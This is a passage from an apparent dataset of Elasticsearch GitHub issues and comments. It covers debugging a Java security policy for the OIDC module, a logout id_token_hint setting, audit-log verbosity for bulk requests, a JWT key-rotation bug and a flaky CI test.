	at org.elasticsearch.security@8.6.0-SNAPSHOT/org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator.getUserClaims(OpenIdConnectAuthenticator.java:267)
	at org.elasticsearch.security@8.6.0-SNAPSHOT/org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator.lambda$authenticate$0(OpenIdConnectAuthenticator.java:224)
	at org.elasticsearch.server@8.6.0-SNAPSHOT/org.elasticsearch.action.ActionListener$2.onResponse(ActionListener.java:162)
	at org.elasticsearch.security@8.6.0-SNAPSHOT/org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator.handleTokenResponse(OpenIdConnectAuthenticator.java:670)
	at org.elasticsearch.security@8.6.0-SNAPSHOT/org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator$2.completed(OpenIdConnectAuthenticator.java:588)
	at org.elasticsearch.security@8.6.0-SNAPSHOT/org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator$2.completed(OpenIdConnectAuthenticator.java:585)
```I tried a global policy, no codebase, but that didn't work either.
```
elasticsearch@55d8e5e70d03:~/modules/x-pack-security$ tail -9 /usr/share/elasticsearch/modules/x-pack-security/plugin-security.policy
grant {
  // needed for com.nimbusds.jose.shaded.gson.Gson.toJson
  permission java.lang.RuntimePermission ""accessDeclaredMembers"";

  // needed for com.nimbusds.oauth2.sdk.id.Identifier#value
  permission java.lang.reflect.ReflectPermission ""suppressAccessChecks"";
};
```I added this to the start of Elasticsearch.main.
```
    public static void main(final String[] args) {
        System.out.println(""JUSTIN Elasticsearch.main JarHell.parseModulesAndClassPath"");
        for (URL url : JarHell.parseModulesAndClassPath()) {
            try {
                System.out.println(""JUSTIN "" + PathUtils.get(url.toURI()));
            } catch (URISyntaxException e) {
                e.printStackTrace();
                throw new RuntimeException(e);
            }
        }
```
I don't see the `x-pack-security` plugin or its `plugin-security.policy` on this classpath.
```
elasticsearch@13f545e25a37:~$ grep JUSTIN /usr/share/elasticsearch/logs/console.log 
JUSTIN Elasticsearch.main JarHell.parseModulesAndClassPath
JUSTIN /usr/share/elasticsearch/lib/lucene-analysis-common-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-core-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-plugin-classloader-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/jna-5.10.0.jar
JUSTIN /usr/share/elasticsearch/lib/ecs-logging-core-1.2.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-secure-sm-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/log4j2-ecs-layout-1.2.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/jopt-simple-5.0.2.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-queryparser-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/HdrHistogram-2.1.9.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-sandbox-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-plugin-analysis-api-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/t-digest-3.2.jar
JUSTIN /usr/share/elasticsearch/lib/lz4-java-1.8.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-cli-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-grouping-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/log4j-api-2.19.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-x-content-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-join-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-suggest-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-plugin-api-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-geo-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-backward-codecs-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-logging-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-log4j-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-queries-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/hppc-0.8.1.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-misc-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-highlighter-9.4.0.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-lz4-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/elasticsearch-core-8.6.0-SNAPSHOT.jar
JUSTIN /usr/share/elasticsearch/lib/lucene-memory-9.4.0.jar
```

How/where does a module like `x-pack-security` get loaded?

What I would like to do is add more logs like above to confirm what is being loaded from x-pack-security. I assume `oauth2-oidc-sdk-9.43.1.jar` and `nimbus-jose-jwt-9.25.4.jar` are loaded from the `x-pack-security` module directory, because their classes are listed in the original stacktrace. I would like to see if `plugin-security.policy` is possibly being ignored.
```
elasticsearch@13f545e25a37:~$ ls -l /usr/share/elasticsearch/modules/x-pack-security/
LICENSE.txt                                          metrics-core-4.1.4.jar                               opensaml-saml-api-4.0.1.jar
NOTICE.txt                                           netty-buffer-4.1.82.Final.jar                        opensaml-saml-impl-4.0.1.jar
accessors-smart-2.4.8.jar                            netty-codec-4.1.82.Final.jar                         opensaml-security-api-4.0.1.jar
asm-9.4.jar                                          netty-codec-http-4.1.82.Final.jar                    opensaml-security-impl-4.0.1.jar
cryptacular-1.2.4.jar                                netty-common-4.1.82.Final.jar                        opensaml-soap-api-4.0.1.jar
failureaccess-1.0.1.jar                              netty-handler-4.1.82.Final.jar                       opensaml-soap-impl-4.0.1.jar
guava-28.2-jre.jar                                   netty-resolver-4.1.82.Final.jar                      opensaml-storage-api-4.0.1.jar
httpclient-cache-4.5.13.jar                          netty-transport-4.1.82.Final.jar                     opensaml-storage-impl-4.0.1.jar
jakarta.mail-2.0.1.jar                               netty-transport-native-unix-common-4.1.82.Final.jar  opensaml-xmlsec-api-4.0.1.jar
java-support-8.0.0.jar                               nimbus-jose-jwt-9.25.4.jar                           opensaml-xmlsec-impl-4.0.1.jar
jcip-annotations-1.0.jar                             oauth2-oidc-sdk-9.43.1.jar                           plugin-descriptor.properties
joda-time-2.10.10.jar                                opensaml-core-4.0.1.jar                              plugin-security.policy
json-smart-2.4.8.jar                                 opensaml-messaging-api-4.0.1.jar                     slf4j-api-1.6.2.jar
jsr305-3.0.2.jar                                     opensaml-messaging-impl-4.0.1.jar                    transport-netty4-8.6.0-SNAPSHOT.jar
lang-tag-1.7.jar                                     opensaml-profile-api-4.0.1.jar                       x-pack-security-8.6.0-SNAPSHOT.jar
log4j-slf4j-impl-2.19.0.jar                          opensaml-profile-impl-4.0.1.jar                      xmlsec-2.1.4.jar
```",yes,">non-issue,:Security/Security,Team:Security,v8.6.0,"
elastic/elasticsearch,1065924148,"Selectively not send `id_token_hint` with the logout request for RP initiated logout in OpenID Connect","Our implementation follows the [RP initiated logout](https://openid.net/specs/openid-connect-rpinitiated-1_0.html) specification. The specification states that sending the `id_token_hint` parameter is `RECOMMENDED` and we set it in all cases. 

However, when the ID Token is large enough because it contains many claims, or many claim values, we run the risk to hit the maximum length of a URL for certain implementations and offer a degraded experience to our users. We should introduce a configuration setting that allows an administrator to disable sending the id_token_hint in the logout request, or disable sending it if it is longer than a configurable length.

More concretely, what I think we should do is:  

1. Introduce a `max_id_token_hint_length` `Setting.AffixSetting<Integer>` in `OpenIdConnectRealmSettings` that describes the maximum length of an encoded ID Token that should be sent as the `id_token_hint`
2. Introduce a `disable_id_token_hint` `Setting.AffixSetting<Integer>` in `OpenIdConnectRealmSettings` with default value being false. 
3. In https://github.com/elastic/elasticsearch/blob/12ad399c488f0cc60e19b5e1b29c6d569cb4351a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/action/oidc/TransportOpenIdConnectLogoutAction.java#L87, if
   -  the length of `id_token_hint` we read from the metadata of the user is larger than  `max_id_token_hint_length` OR
   - `disable_id_token_hint` is set to true
   
    pass `null` to `OpenIDConnectRealm#buildLogoutResponse`
","Pinging @elastic/es-security (Team:Security)Would sending a POST request be a suitable solution? The spec says it can be either GET or POST and with POST you don't have to worry about url limit. Although I suppose this will require changes in Kibana.Thank you for your comment @megakoresh. Yes, POST is also a solution but as you identified this would require changes in other parts of the stack. We will discuss this and identify the best path(s) forwardWhat's the status of this issue? Has there been any progress?If/when this will be implemented, let's mention in which situations we should use this setting in the ""Troubleshooting"" section in the Docs. Thank you for tracking this ❤️ ",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,770443267,"Cut down audit verbosity for bulk index actions","I think it's probably better to illustrate the issue with two examples that show the audited output of bulk requests:

1) given the following index request:
```
curl -u elastic:password -X POST ""localhost:9200/_bulk?pretty"" -H 'Content-Type: application/json' -d'
{ ""index"" : { ""_index"" : ""test"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }
{ ""index"" : { ""_index"" : ""test2"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }
{ ""index"" : { ""_index"" : ""test3"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }

{ ""delete"" : { ""_index"" : ""test"", ""_id"" : ""2"" } }
{ ""delete"" : { ""_index"" : ""test2"", ""_id"" : ""2"" } }
{ ""delete"" : { ""_index"" : ""test3"", ""_id"" : ""2"" } }

{ ""create"" : { ""_index"" : ""test"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }
{ ""create"" : { ""_index"" : ""test2"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }
{ ""create"" : { ""_index"" : ""test3"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }

{ ""update"" : {""_id"" : ""1"", ""_index"" : ""test""} }
{ ""doc"" : {""field2"" : ""value2""} }
{ ""update"" : {""_id"" : ""1"", ""_index"" : ""test2""} }
{ ""doc"" : {""field2"" : ""value2""} }
{ ""update"" : {""_id"" : ""1"", ""_index"" : ""test3""} }
{ ""doc"" : {""field2"" : ""value2""} }
'
```
, which performs all the 4 allowed bulk index action types on each of 3 distinct indices (test, test2, and test3),
it will produce the following simplified audit output:
```
{ ...""event.action"":""access_granted"", ... , ""origin.type"":""rest"", ... , ""action"":""indices:data/write/bulk"", ""request.name"":""BulkRequest""}

{ ... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s]"", ""request.name"":""BulkShardRequest"", ""indices"":[""test2""]}
{ ... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""test2""]}
{ ..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""test2""]}
{ ..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""test2""]}
{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""test2""]}
{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s][p]"", ""request.name"":""BulkShardRequest"", ""indices"":[""test2""]}

{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s]"", ""request.name"":""BulkShardRequest"", ""indices"":[""test3""]}
{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""test3""]}
{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""test3""]}
{..., ""event.action"":""access_granted"", ..., ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""test3""]}
{..., ""event.action"":""access_granted"", ..., ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""test3""]}
{..., ""event.action"":""access_granted"", ..., ""action"":""indices:data/write/bulk[s][p]"", ""request.name"":""BulkShardRequest"", ""indices"":[""test3""]}

{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s]"", ""request.name"":""BulkShardRequest"", ""indices"":[""test""]}
{..., ""event.action"":""access_granted"", ..., ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""test""]}
{..., ""event.action"":""access_granted"", ..., ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""test""]}
{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""test""]}
{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""test""]}
{..., ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s][p]"", ""request.name"":""BulkShardRequest"", ""indices"":[""test""]}
```
The particular verbosity that I take issue with in this case is that each operation type has a separate entry for each index name.

I suggest we collate the entries representing the `BulkItemRequest`, such that a single entry has multiple actions. The exact format is to be discussed.

Note however that, even if all the item requests target a single shard, the index names can be different because each can refer a different alias that points to the same index. Also note that the `BulkShardRequest`s, unlike the `BulkItemRequest`s, might contain date math expressions for the index name:

2) 
```
curl -u elastic:password -X POST ""localhost:9200/_bulk?pretty"" -H 'Content-Type: application/json' -d'
{ ""index"" : { ""_index"" : ""<index-{now/d}>"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }
{ ""index"" : { ""_index"" : ""<alias-{now/d+1d}>"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }
{ ""index"" : { ""_index"" : ""<index-{now/d+2d}>"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }

{ ""delete"" : { ""_index"" : ""<alias-{now/d}>"", ""_id"" : ""2"" } }
{ ""delete"" : { ""_index"" : ""<index-{now/d+1d}>"", ""_id"" : ""2"" } }
{ ""delete"" : { ""_index"" : ""<alias-{now/d+2d}>"", ""_id"" : ""2"" } }

{ ""create"" : { ""_index"" : ""<index-{now/d}>"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }
{ ""create"" : { ""_index"" : ""<alias-{now/d+1d}>"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }
{ ""create"" : { ""_index"" : ""<index-{now/d+2d}>"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }

{ ""update"" : {""_id"" : ""1"", ""_index"" : ""<alias-{now/d}>""} }
{ ""doc"" : {""field2"" : ""value2""} }
{ ""update"" : {""_id"" : ""1"", ""_index"" : ""<index-{now/d+1d}>""} }
{ ""doc"" : {""field2"" : ""value2""} }
{ ""update"" : {""_id"" : ""1"", ""_index"" : ""<alias-{now/d+2d}>""} }
{ ""doc"" : {""field2"" : ""value2""} }
'
```
which is a similar bulk index operation that really targets 3 indices, but sometimes through an alias (there are 3 indices and 3 aliases with a 1-1 association), generates the following:
```
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk"", ""request.name"":""BulkRequest""}

{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s]"", ""request.name"":""BulkShardRequest"", ""indices"":[""<index-{now/d+1d}>"",""<alias-{now/d+1d}>""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2020.12.18""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2020.12.18""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2020.12.18""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2020.12.18""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s][p]"", ""request.name"":""BulkShardRequest"", ""indices"":[""<index-{now/d+1d}>"",""<alias-{now/d+1d}>""]}

{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s]"", ""request.name"":""BulkShardRequest"", ""indices"":[""<alias-{now/d+2d}>"",""<index-{now/d+2d}>""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2020.12.19""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2020.12.19""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2020.12.19""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2020.12.19""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s][p]"", ""request.name"":""BulkShardRequest"", ""indices"":[""<alias-{now/d+2d}>"",""<index-{now/d+2d}>""]}

{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s]"", ""request.name"":""BulkShardRequest"", ""indices"":[""<index-{now/d}>"",""<alias-{now/d}>""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2020.12.17""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2020.12.17""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2020.12.17""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2020.12.17""]}
{... ""event.action"":""access_granted"", ... , ""action"":""indices:data/write/bulk[s][p]"", ""request.name"":""BulkShardRequest"", ""indices"":[""<index-{now/d}>"",""<alias-{now/d}>""]}
```

Here's the interesting part of the code related to this https://github.com/elastic/elasticsearch/blob/b622adeb7adfe3dc0d731352e43075e94e464ff1/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/AuthorizationService.java#L557 
","Pinging @elastic/es-security (Team:Security)We've discussed this during last week's team meeting.

Tim had a great hint that the greater verbosity load is due to printing individual log entries for every granted bulk item.
When the action (eg `indices:data/write/index:op_type/create`) and the index name are the same, the item log entries
are essentially identical. Note that the index name is usually the same for a bulk shard request (unless some items refer to the shard via an alias), and the value range for actions is limited to four values only, so there is a great opportunity for log entry de-duplication.

For example, tweaking the above bulk request slightly:
```
curl -u elastic:password -X POST ""localhost:9200/_bulk?pretty"" -H 'Content-Type: application/json' -d'
{ ""index"" : { ""_index"" : ""<index-{now/d}>"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }
{ ""index"" : { ""_index"" : ""<alias-{now/d}>"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }
{ ""index"" : { ""_index"" : ""<index-{now/d}>"", ""_id"" : ""3"" } }
{ ""field1"" : ""value3"" }

{ ""delete"" : { ""_index"" : ""<alias-{now/d}>"", ""_id"" : ""1"" } }
{ ""delete"" : { ""_index"" : ""<index-{now/d}>"", ""_id"" : ""2"" } }
{ ""delete"" : { ""_index"" : ""<alias-{now/d}>"", ""_id"" : ""3"" } }

{ ""create"" : { ""_index"" : ""<index-{now/d}>"", ""_id"" : ""1"" } }
{ ""field1"" : ""value1"" }
{ ""create"" : { ""_index"" : ""<alias-{now/d}>"", ""_id"" : ""2"" } }
{ ""field1"" : ""value2"" }
{ ""create"" : { ""_index"" : ""<index-{now/d}>"", ""_id"" : ""3"" } }
{ ""field1"" : ""value3"" }

{ ""update"" : {""_id"" : ""1"", ""_index"" : ""<alias-{now/d}>""} }
{ ""doc"" : {""field2"" : ""value1""} }
{ ""update"" : {""_id"" : ""2"", ""_index"" : ""<index-{now/d}>""} }
{ ""doc"" : {""field2"" : ""value2""} }
{ ""update"" : {""_id"" : ""3"", ""_index"" : ""<alias-{now/d}>""} }
{ ""doc"" : {""field2"" : ""value2""} }
```
We currently audit identical bulk items like this: 
```
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,160+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,161+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,171+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2021.01.12""]}

{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,161+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,161+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,172+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/index:op_type/create"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2021.01.12""]}

{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,161+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,171+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,172+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/delete"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2021.01.12""]}

{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,172+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,172+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""alias-2021.01.12""]}
{""type"":""audit"", ""timestamp"":""2021-01-13T00:22:09,162+0200"", ""node.id"":""fQ78V35NTEmm0wbZed-VQA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:63774"", ""request.id"":""s6kN4tzlQMO5XZum1Ex9JQ"", ""action"":""indices:data/write/update"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-2021.01.12""]}
```

The next step is to find some sort of practical confirmation for this supposition (eg find a support case with a big audit log), before jumping into implementation. ",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,1269582849,"JWTRealm Auto Rotating JWKS","### Elasticsearch Version

8.2.2

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

Elastic Cloud

### Problem Description

According to the docs the JWT Realm will re-fetch the key if the signature is not valid using the current loaded JWKSet.
But this does not happen, as seen here: https://github.com/elastic/elasticsearch/blob/76be7bcdc060a1031a05aa21b1cfc8627b5e7093/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/jwt/JwtRealm.java#L427


**Docs Reference:**
https://www.elastic.co/guide/en/elasticsearch/reference/current/security-settings.html#:~:text=elasticsearch%20automatically%20caches%20the%20retrieved%20jwk%20set%20to%20avoid%20unnecessary%20http%20requests%2C%20but%20will%20attempt%20to%20refresh%20the%20jwk%20upon%20signature%20verification%20failure%2C%20as%20this%20might%20indicate%20that%20the%20jwt%20provider%20has%20rotated%20the%20signing%20keys.

### Steps to Reproduce

1. Create a Google Cloud Service Account
2. When using this configuration (with Google's daily auto-rotating JWKSet)
```yaml
xpack:
    security:
        authc:
            realms:
                jwt:
                    jwt1:
                        order: 2
                        client_authentication.type: none
                        allowed_issuer: ""https://accounts.google.com""
                        allowed_audiences: [""xxx""]
                        allowed_signature_algorithms: [""RS256""]
                        pkc_jwkset_path: ""https://www.googleapis.com/oauth2/v3/certs""
                        claims.principal: sub
```
3. Create a role mapping with realm set to `jwt1` and the username to the ID of the service account in Google Cloud
4. After about a day this authentication will not work anymore

### Logs (if relevant)

No logs just 401's","FYI, this bug also seems to accept tokens that were created using a possibly inferred/cracked JWKSet, there is a reason that Google rotates these keys. Restarting the instance seems to temporarily fix the issueCreated a support case with Elastic to expedite this.Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Authentication,"
elastic/elasticsearch,578606283,"[CI] Intermittent timeout in xpack ReadActionsTests","I've noticed an occasional timeout in ReadActionTests. It doesn't reproduce for me locally, but it's popped up a few times recently:

10 March:
* Failure on 7.x: https://gradle-enterprise.elastic.co/s/kxifwgcjb2gv4
* Method: testWildcardExclusion
* Example reproduce line:

```
REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authz.ReadActionsTests.testWildcardExclusion"" \
  -Dtests.seed=254EEC6E8CC43E34 \
  -Dtests.security.manager=true \
  -Dtests.locale=mk-MK \
  -Dtests.timezone=America/Argentina/Cordoba \
  -Dcompiler.java=13
```

9 March:
* Failure on master: https://gradle-enterprise.elastic.co/s/sc56ehkzdc4de
* Method: testMultiSearchUnauthorizedIndex

8 March:
* Failure on master: https://gradle-enterprise.elastic.co/s/jc34yk26z5lg2
